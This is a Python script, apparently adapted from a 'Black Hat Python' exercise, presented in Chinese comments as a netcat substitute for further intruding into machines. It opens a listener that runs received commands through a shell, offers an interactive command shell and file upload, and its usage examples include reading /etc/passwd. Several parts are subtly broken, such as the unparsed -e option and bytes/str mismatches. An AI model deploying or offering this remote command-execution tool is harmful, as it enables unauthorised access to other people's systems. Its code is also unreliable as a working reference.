#!/usr/bin/env python3 
## -*- coding: utf-8 -*- """ 
#@author zhangbohan.dell@gmail.com     
#@function:python程序，取代netcat，通常有些电脑并没有安装netcat，但是安装了python，就可以很好的利用本工具进行进一步入侵     @create 18-4-30 下午9:28"""

import sys
import socket
import getopt
import threading
import subprocess

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print("BHP Net Tool", end="\r\n")
    print("Uasge:bhpnet.py -t target_host -p port")
    print("-l --listen    -listen on[host]:[port] for incoming connections")
    print("-e --execute=file_to_run   - execute the given file opon receiving a connection")
    print("-c --command     -initlize a command shell")
    print("-u --upload=destination      -upon receiving connegtion upload a file and write to["
          "destination]", end="\r\n\r\n")
    print("Examples:")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFHGI' | ./bhpnet.py -t 192.168.0.1 -p 135 ")
    sys.exit(0)


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        #      连接到目标主机

        client.connect((target, port))
        if len(buffer):
            client.send(buffer.encode())

        while True:
            #         现在等待数据回传
            recv_len = 1
            response = ""
            while recv_len:      
                data = client.recv(4096).decode()
                recv_len = len(data)
                print(data)
                response += data
                if recv_len < 4096:
                    break

            print(response)
            # 等待更多的输入
            buffer = input("")
            buffer += "\n"
            #         发送出去
            client.send(buffer.encode())
    except:
        print("[*] Exception ! Exiting.")
        #     关闭链接
        client.close()


def server_loop():
    global target

#     如果没有定义目标，那么我们监听所有接口
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

#         分拆一个线程处理新的客户端
        client_thread = threading.Thread(
            target=client_handle, args=(client_socket,))
        client_thread.start()


def run_command(command):
    #     换行
    command = command.rstrip()
# 运行命令并返回
    try:
        output = subprocess.check_output(
            command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to excute command .\r\n"

#     将输出发送
    return output


def client_handle(client_socket):
    global upload
    global execute
    global command
#     检测上传文件
    if len(upload_destination):
        # 读取所有的字符并写下目标
        file_buffer = ""
        while True:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            else:
                file_buffer += data
#     现在我们将接受这些数据并将他们写出来
    try:
        file_descriptor = open(upload_destination, "wb")
        file_descriptor.write(file_buffer)
        file_descriptor.close()
        # 确认文件已经写出来
        client_socket.send(("Successfully saved file to %s\r\n" %
                            upload_destination).encode())
    except:
        client_socket.send(("Failed to save file to %s\r\n" %
                            upload_destination).encode())

    #    检查命令行
    if len(execute):
        # 运行命令
        output = run_command(execute)
        client_socket.send(output.encode())

#         如果需要一个名林你工行shell，那么进入另一个循环
        if command:
            while True:
                #                 跳出一个窗口
                client_socket.send(("<BHP:#>").encode())
#                 现在我们接受文件知道发现换行符（enter key）
                cmd_buffer = ""
                while "\n" not in cmd_buffer:
                    cmd_buffer += client_socket.recv(1024).decode()
#                     返还命令输出
                response = run_command(cmd_buffer)
#                 返还相应数据
                client_socket.send(response.encode())


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()
    #     读取命令行选项
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target",
                                    "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

        # 我们是进行监听还是仅从标准输入发送数据
        if not listen and len(target) and port > 0:
            # 从命令行读取内存数据
            # 这里将阻塞，所以不再向标准输入发送数据发送CTRL-D
            buffer = sys.stdin.read()
            # 发送数据
            client_sender(buffer)

    # 我们开始监听并准备上传文件、执行命令
    # 放置一个反弹shell
    # 取决于上面的命令行选项
    if listen:
        server_loop()


main()
